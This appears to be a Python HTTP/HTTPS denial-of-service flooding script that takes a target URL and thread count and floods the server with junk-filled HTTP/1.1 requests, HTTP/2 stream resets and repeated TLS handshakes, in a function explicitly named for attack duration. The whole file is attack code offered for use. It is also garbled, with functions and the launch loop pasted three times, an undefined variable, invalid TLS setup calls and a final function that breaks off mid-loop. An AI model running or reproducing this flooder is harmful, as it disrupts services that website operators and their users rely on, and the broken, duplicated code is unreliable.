import socket,ssl,threading
from MODEL.data import get_target,generate_url_path
##
import threading, sys, random,socket,ssl,struct, base64
from MODEL.data import get_target, generate_url_path

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.errors import ErrorCodes
from h2.events import RequestReceived
import threading, sys, random,socket,ssl,struct, base64
from MODEL.data import get_target, generate_url_path

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.errors import ErrorCodes
from h2.events import RequestReceived
import threading, sys, random,socket,ssl,struct, base64
from MODEL.data import get_target, generate_url_path

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.errors import ErrorCodes
from h2.events import RequestReceived

def keep_sending(sock,p):
    try:
        for _ in range(250):
            sock.sendall(p[0]); sock.sendall(p[1])
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except:
        pass
        
def keep_sending(sock,p):
    try:
        for _ in range(250):
            sock.sendall(p[0]); sock.sendall(p[1])
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except:
        pass
                
def keep_sending(sock,p):
    try:
        for _ in range(250):
            sock.sendall(p[0]); sock.sendall(p[1])
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except:
        pass        

def h2_con(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        conn = H2Connection(config=H2Configuration(client_side=True))
        conn.initiate_connection()
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, [(":method", meth), (":scheme", "https"), (":authority", target['host']), (":path", target['uri'])], end_stream=True)
        s.sendall(conn.data_to_send())
        while True:
            data = s.recv(65536)
            if not data:break

            events = conn.receive_data(data)
            for event in events:
                if isinstance(event, RequestReceived):
                    conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)

                s.sendall(conn.data_to_send())
    except:pass
 
def h2_con(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        conn = H2Connection(config=H2Configuration(client_side=True))
        conn.initiate_connection()
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, [(":method", meth), (":scheme", "https"), (":authority", target['host']), (":path", target['uri'])], end_stream=True)
        s.sendall(conn.data_to_send())
        while True:
            data = s.recv(65536)
            if not data:break

            events = conn.receive_data(data)
            for event in events:
                if isinstance(event, RequestReceived):
                    conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)

                s.sendall(conn.data_to_send())
    except:pass   
def h2_con(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        conn = H2Connection(config=H2Configuration(client_side=True))
        conn.initiate_connection()
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, [(":method", meth), (":scheme", "https"), (":authority", target['host']), (":path", target['uri'])], end_stream=True)
        s.sendall(conn.data_to_send())
        while True:
            data = s.recv(65536)
            if not data:break

            events = conn.receive_data(data)
            for event in events:
                if isinstance(event, RequestReceived):
                    conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)

                s.sendall(conn.data_to_send())
    except:pass
    
def connect(target, meth):
    try:
       path = 1
       for _ in range(250):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        threading.Thread(target=keep_sending,args=(s,[f"{meth} {a} HTTP/1.1\r\nHost: {target['host']}\r\nX-HTTP-Method-Override: POST\r\nAuthorization: Basic {base64.b64encode(f'{generate_url_path(1)}:{generate_url_path(1)}'.encode()).decode()}\r\nRange: bytes=18-18446744073709551615\r\nAccept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA, BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, OOOAOAOOOAOOAOOOAOOOAOOOAOO, ****************************stupiD, doar-e, ftw, imo, *, ,\r\nCache-Control: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\npragma: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\nCloudflare-CDN-Cache-Control: max-age=24400\r\nCDN-Cache-Control: max-age=18000\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]])).start()
        path += 1
    except:pass

url = ''; meth = ''; thread = 0

if len(sys.argv) == 4:
    url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:
    print(f'')
target = get_target(url)
for _ in range(thread):
        threading.Thread(target=h2_con,args=(target,)).start()
        threading.Thread(target=connect, args=(target, meth)).start()
        
def connect(target, meth):
    try:
       path = 1
       for _ in range(250):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        threading.Thread(target=keep_sending,args=(s,[f"{meth} {a} HTTP/1.1\r\nHost: {target['host']}\r\nX-HTTP-Method-Override: POST\r\nAuthorization: Basic {base64.b64encode(f'{generate_url_path(1)}:{generate_url_path(1)}'.encode()).decode()}\r\nRange: bytes=18-18446744073709551615\r\nAccept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA, BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, OOOAOAOOOAOOAOOOAOOOAOOOAOO, ****************************stupiD, doar-e, ftw, imo, *, ,\r\nCache-Control: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\npragma: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\nCloudflare-CDN-Cache-Control: max-age=24400\r\nCDN-Cache-Control: max-age=18000\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]])).start()
        path += 1
    except:pass

url = ''; meth = ''; thread = 0

if len(sys.argv) == 4:
    url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:
    print(f'')
target = get_target(url)
for _ in range(thread):
        threading.Thread(target=h2_con,args=(target,)).start()
        threading.Thread(target=connect, args=(target, meth)).start()
                
def connect(target, meth):
    try:
       path = 1
       for _ in range(250):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setblocking(1); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1)
        s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port'])))
        a = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23)
        a.options = ssl.OP_NO_RENEGOTIATION
        a.set_ciphers('AES256-SHA256:AES128-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DES-CBC3-SHA:AES128-SHA256:ECDHE-RSA-AES256-GCM-SHA384:AES256-SHA:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA')
        s = a.wrap_socket(s,server_hostname=target['host'])
        threading.Thread(target=keep_sending,args=(s,[f"{meth} {a} HTTP/1.1\r\nHost: {target['host']}\r\nX-HTTP-Method-Override: POST\r\nAuthorization: Basic {base64.b64encode(f'{generate_url_path(1)}:{generate_url_path(1)}'.encode()).decode()}\r\nRange: bytes=18-18446744073709551615\r\nAccept-Encoding: AAAAAAAAAAAAAAAAAAAAAAAA, BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, OOOAOAOOOAOOAOOOAOOOAOOOAOO, ****************************stupiD, doar-e, ftw, imo, *, ,\r\nCache-Control: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\npragma: public, max-age=24400, s-maxage=84000, proxy-revalidate, must-revalidate, no-cache, no-store, ,\r\nCloudflare-CDN-Cache-Control: max-age=24400\r\nCDN-Cache-Control: max-age=18000\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 PTST/190628.140653\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-GPC: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Dest: document\r\nUpgrade-Insecure-Requests: 1\r\nTe: trailers\r\nConnection: Keep-Alive\r\n\r\n".encode() for a in [f'/{generate_url_path(num=path)}',target['uri']]])).start()
        path += 1
    except:pass

url = ''; meth = ''; thread = 0

if len(sys.argv) == 4:
    url, thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:
    print(f'')
target = get_target(url)
for _ in range(thread):
        threading.Thread(target=h2_con,args=(target,)).start()
        threading.Thread(target=connect, args=(target, meth)).start()
  
def RENEGOTIATE_KEY(target,methods,duration_sec_attack_dude):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            for _ in range(500):
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((str(target['host']),int(target['port'])))
             s.connect_ex((str(target['host']),int(target['port'])))
             ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2)
             curve_list = ['prime256v1','secp384r1','secp521r1']
             for ecdh_got in curve_list:
              try:
               ssl_context.set_ecdh_curve(ecdh_got)
              except:
               pass
             protocols = ['stun.turn', 'stun.nat-discovery', 'h2c', 'smb', 'h3', 'h2', 'http/1.1', 'http/1.0', 'http/0.9', 'spdy/1', 'spdy/2', 'spdy/3', 'spdy/3.1', 'quic', 'ldap', 'ftp', 'imap', 'pop3', 'dns', 'xmpp-client', 'webrtc', 'c-webrtc', 'coap', 'managesieve', 'xmpp-server', 'acme-tls/1', 'mqtt', 'dot', 'ntske/1', 'sunrpc', 'irc', 'doq', 'sip2', 'tds/8.0', 'dicom']
             for p in protocols:
              ssl_context.set_alpn_protocols(p)
              ssl_context.set_npn_protocols
             ssl_context.set_ciphers('TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:HIGH:!aNULL:!kRSA:!MD5:!RC4:!PSK:!SRP:!DSS:!DSA:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA:RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCMECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA:NULL-MD5:NULL-SHA:RC4-MD5:RC4-SHA:IDEA-CBC-SHA:DES-CBC3-SHA:DHE-DSS-DES-CBC3-SHA:DHE-RSA-DES-CBC3-SHA:ADH-RC4-MD5:ADH-DES-CBC3-SHA:NULL-SHA256:AES128-SHA256:AES256-SHA256:AES128-GCM-SHA256:AES256-GCM-SHA384:DH-RSA-AES128-SHA256:DH-RSA-AES256-SHA256:DH-RSA-AES128-GCM-SHA256:DH-RSA-AES256-GCM-SHA384:DH-DSS-AES128-SHA256:DH-DSS-AES256-SHA256:DH-DSS-AES128-GCM-SHA256:DH-DSS-AES256-GCM-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-DSS-AES128-SHA256:DHE-DSS-AES256-SHA256:DHE-DSS-AES128-GCM-SHA256:DHE-DSS-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ADH-AES128-SHA256:ADH-AES256-SHA256:ADH-AES128-GCM-SHA256:ADH-AES256-GCM-SHA384:AES128-CCM:AES256-CCM:DHE-RSA-AES128-CCM:DHE-RSA-AES256-CCM:AES128-CCM8:AES256-CCM8:DHE-RSA-AES128-CCM8:DHE-RSA-AES256-CCM8:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-AES128-CCM8:ECDHE-ECDSA-AES256-CCM8:PSK-NULL-SHA:DHE-PSK-NULL-SHA:RSA-PSK-NULL-SHA:PSK-RC4-SHA:PSK-3DES-EDE-CBC-SHA:PSK-AES128-CBC-SHA:PSK-AES256-CBC-SHA:DHE-PSK-RC4-SHA:DHE-PSK-3DES-EDE-CBC-SHA:DHE-PSK-AES128-CBC-SHA:DHE-PSK-AES256-CBC-SHA:RSA-PSK-RC4-SHA:RSA-PSK-3DES-EDE-CBC-SHA:RSA-PSK-AES128-CBC-SHA:RSA-PSK-AES256-CBC-SHA:PSK-AES128-GCM-SHA256:PSK-AES256-GCM-SHA384:DHE-PSK-AES128-GCM-SHA256:DHE-PSK-AES256-GCM-SHA384:RSA-PSK-AES128-GCM-SHA256:RSA-PSK-AES256-GCM-SHA384:PSK-AES128-CBC-SHA256:PSK-AES256-CBC-SHA384:PSK-NULL-SHA256:PSK-NULL-SHA384:DHE-PSK-AES128-CBC-SHA256:DHE-PSK-AES256-CBC-SHA384:DHE-PSK-NULL-SHA256:DHE-PSK-NULL-SHA384:RSA-PSK-AES128-CBC-SHA256:RSA-PSK-AES256-CBC-SHA384:RSA-PSK-NULL-SHA256:RSA-PSK-NULL-SHA384:ECDHE-PSK-RC4-SHA:ECDHE-PSK-3DES-EDE-CBC-SHA:ECDHE-PSK-AES128-CBC-SHA:ECDHE-PSK-AES256-CBC-SHA:ECDHE-PSK-AES128-CBC-SHA256:ECDHE-PSK-AES256-CBC-SHA384:ECDHE-PSK-NULL-SHA:ECDHE-PSK-NULL-SHA256:ECDHE-PSK-NULL-SHA384:PSK-CAMELLIA128-SHA256:PSK-CAMELLIA256-SHA384:DHE-PSK-CAMELLIA128-SHA256:DHE-PSK-CAMELLIA256-SHA384:RSA-PSK-CAMELLIA128-SHA256:RSA-PSK-CAMELLIA256-SHA384:ECDHE-PSK-CAMELLIA128-SHA256:ECDHE-PSK-CAMELLIA256-SHA384:PSK-AES128-CCM:PSK-AES256-CCM:DHE-PSK-AES128-CCM:DHE-PSK-AES256-CCM:PSK-AES128-CCM8:PSK-AES256-CCM8:DHE-PSK-AES128-CCM8:DHE-PSK-AES256-CCM8:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:PSK-CHACHA20-POLY1305:ECDHE-PSK-CHACHA20-POLY1305:DHE-PSK-CHACHA20-POLY1305:RSA-PSK-CHACHA20-POLY1305:EDH-RSA-DES-CBC3-SHA:EDH-DSS-DES-CBC3-SHA:ECDHE-ECDSA-CAMELLIA128-SHA256:ECDHE-ECDSA-CAMELLIA256-SHA384:ECDHE-RSA-CAMELLIA128-SHA256:ECDHE-RSA-CAMELLIA256-SHA384:ARIA128-GCM-SHA256:ARIA256-GCM-SHA384:DHE-RSA-ARIA128-GCM-SHA256:DHE-RSA-ARIA256-GCM-SHA384:DHE-DSS-ARIA128-GCM-SHA256:DHE-DSS-ARIA256-GCM-SHA384:ECDHE-ECDSA-ARIA128-GCM-SHA256:ECDHE-ECDSA-ARIA256-GCM-SHA384:ECDHE-ARIA128-GCM-SHA256:ECDHE-ARIA256-GCM-SHA384:PSK-ARIA128-GCM-SHA256:PSK-ARIA256-GCM-SHA384:DHE-PSK-ARIA128-GCM-SHA256:DHE-PSK-ARIA256-GCM-SHA384:RSA-PSK-ARIA128-GCM-SHA256:RSA-PSK-ARIA256-GCM-SHA384:ECDHE-RSA-NULL-SHA:ECDHE-RSA-RC4-SHA:ECDHE-RSA-DES-CBC3-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-NULL-SHA:ECDHE-ECDSA-RC4-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:AECDH-NULL-SHA:AECDH-RC4-SHA:AECDH-DES-CBC3-SHA:AECDH-AES128-SHA:AECDH-AES256-SHA:DHE-DSS-RC4-SHA:GOST2012-GOST8912-GOST8912:GOST2012-NULL-GOST12:GOST94-GOST89-GOST89:GOST2001-GOST89-GOST89:GOST94-NULL-GOST94:GOST2001-NULL-GOST94:SEED-SHA:DH-DSS-SEED-SHA:DH-RSA-SEED-SHA:DHE-DSS-SEED-SHA:DHE-RSA-SEED-SHA:ADH-SEED-SHA:CAMELLIA128-SHA:CAMELLIA256-SHA:DH-DSS-CAMELLIA128-SHA:DH-DSS-CAMELLIA256-SHA:DH-RSA-CAMELLIA128-SHA:DH-RSA-CAMELLIA256-SHA:DHE-DSS-CAMELLIA128-SHA:DHE-DSS-CAMELLIA256-SHA:DHE-RSA-CAMELLIA128-SHA:DHE-RSA-CAMELLIA256-SHA:ADH-CAMELLIA128-SHA:ADH-CAMELLIA256-SHA:AES128-SHA:AES256-SHA:DH-DSS-AES128-SHA:DH-DSS-AES256-SHA:DH-RSA-AES128-SHA:DH-RSA-AES256-SHA:DHE-DSS-AES128-SHA:DHE-DSS-AES256-SHA:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA:ADH-AES128-SHA:ADH-AES256-SHA:DH-DSS-DES-CBC3-SHA:DH-RSA-DES-CBC3-SHA:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:ECDH+AESGCM')
             ssl_socket = ssl_context.wrap_socket(s,server_hostname=target['host'])
             ssl_context.options |= ssl.HAS_TLSv1
